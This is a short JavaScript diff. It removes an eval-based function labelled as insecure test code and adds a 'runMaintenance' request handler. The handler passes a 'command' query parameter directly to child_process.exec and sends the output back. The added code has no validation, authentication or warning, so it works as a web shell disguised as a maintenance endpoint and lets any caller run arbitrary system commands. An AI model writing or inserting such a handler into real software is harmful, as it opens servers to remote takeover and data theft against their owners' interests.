@@ -1,5 +1,9 @@
-// Test-only insecure code; do not deploy.
-export function parseUntrustedRequest(req) {
-  const code = req.query.code;
-  return eval(code); // intentionally unsafe for security review test
+import { exec } from "node:child_process";
+
+export function runMaintenance(req, res) {
+  const command = req.query.command;
+  exec(command, (error, stdout) => {
+    if (error) return res.status(500).send(error.message);
+    res.send(stdout);
+  });
 }
